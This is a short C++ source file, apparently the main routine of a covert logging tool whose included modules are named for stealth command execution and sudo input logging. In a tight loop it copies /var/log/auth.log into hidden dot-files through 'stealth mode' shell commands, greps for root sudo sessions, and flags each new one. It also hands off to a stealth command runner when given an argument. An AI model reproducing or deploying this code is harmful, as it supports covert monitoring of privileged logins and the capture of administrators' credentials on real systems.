#include "inputBypassLoggers/externalCode_helpers/getConsoleOutputOfCommand.h"
#include "runCommandsInStealthMode/runCommandsFromCLIInStealthMode.h"
#include "runCommandsInStealthMode/runCommandsInStealthMode.h"
#include "inputBypassLoggers/inputSudoLogger.h"
#include <iostream>
#include <string>
#include "unistd.h" // move



int main(int argc, char** argv){
        if(argc == 2){
		_main(argc,argv); // FROM runCommandsInStealthMode/runCommandsInStealthMode.h
	}

	std::string sudoDumps;
        int sizeOfSudoDump;
	int sizeOfSudoDumpBeforeAction;
        int sizeOfSudoDumpAfterAction;
	//sudo tracker
 	while(true) {
 		usleep(3000);
		runThisCommandInStealthMode("bash -c 'cat /var/log/auth.log >> .auth.log.dump.current'",true);
                runThisCommandInStealthMode("bash -c 'cp .auth.log.dump.current .auth.log.dump.previous'",true);
                runThisCommandInStealthMode("bash -c 'rm .auth.log.dump.current'",true);
        	sudoDumps = getConsoleOutputOfThisCommand("grep 'sudo: pam_unix(sudo:session): session opened for user root by' .*.previous");
        	sizeOfSudoDump = sudoDumps.length();
		sizeOfSudoDumpBeforeAction = sizeOfSudoDumpAfterAction;
		sizeOfSudoDumpAfterAction = sizeOfSudoDump;
		if(sizeOfSudoDumpBeforeAction < sizeOfSudoDumpAfterAction){
			std::cout << "SUDO" << std::endl;
		}
	}
}
